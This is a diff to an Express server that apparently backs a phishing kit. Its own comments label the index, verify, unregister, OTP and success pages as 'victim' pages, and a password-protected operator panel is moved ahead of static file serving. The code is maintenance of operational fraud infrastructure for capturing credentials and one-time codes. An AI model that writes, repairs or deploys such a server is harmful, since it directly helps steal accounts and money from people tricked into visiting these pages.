@@ -33,22 +33,21 @@ let currentDomain     = '';          // filled at boot + on every request
 
 const SESSION_TIMEOUT = 3 * 60 * 1000; // 3 min idle fallback
 
-/* ----------  STATIC ROUTES  ---------- */
-app.use(express.static(__dirname));
+/* ----------  BLOCK DIRECT ACCESS TO PANEL FILES  ---------- */
+app.use((req, res, next) => {
+  if (req.path === '/_panel.html' || req.path === '/panel.html') {
+    return res.redirect('/panel');
+  }
+  next();
+});
 
-app.get('/',             (req, res) => res.sendFile(__dirname + '/index.html'));
-app.get('/verify.html',  (req, res) => res.sendFile(__dirname + '/verify.html'));
-app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
-app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
-app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));
-
-/* ----------  PANEL ACCESS CONTROL  ---------- */
+/* ----------  PANEL ACCESS CONTROL (BEFORE STATIC)  ---------- */
 app.get('/panel', (req, res) => {
   if (req.session?.authed) return res.sendFile(__dirname + '/_panel.html');
   res.sendFile(__dirname + '/access.html');
 });
 
-app.post('/panel', (req, res) => {
+app.post('/panel/login', (req, res) => {
   const { user, pw } = req.body;
   if (user === PANEL_USER && pw === PANEL_PASS) {
     req.session.authed = true;
@@ -62,8 +61,17 @@ app.post('/panel/logout', (req, res) => {
   res.redirect('/panel');
 });
 
-// block direct file access
-app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
+/* ----------  STATIC ROUTES (AFTER PANEL ROUTES)  ---------- */
+app.use(express.static(__dirname, {
+  index: false  // Disable index.html as default
+}));
+
+/* ----------  VICTIM PAGE ROUTES  ---------- */
+app.get('/',             (req, res) => res.sendFile(__dirname + '/index.html'));
+app.get('/verify.html',  (req, res) => res.sendFile(__dirname + '/verify.html'));
+app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
+app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
+app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));
 
 /* ----------  DOMAIN HELPER – sets currentDomain for every request  ---------- */
 app.use((req, res, next) => {
@@ -393,4 +401,3 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
-
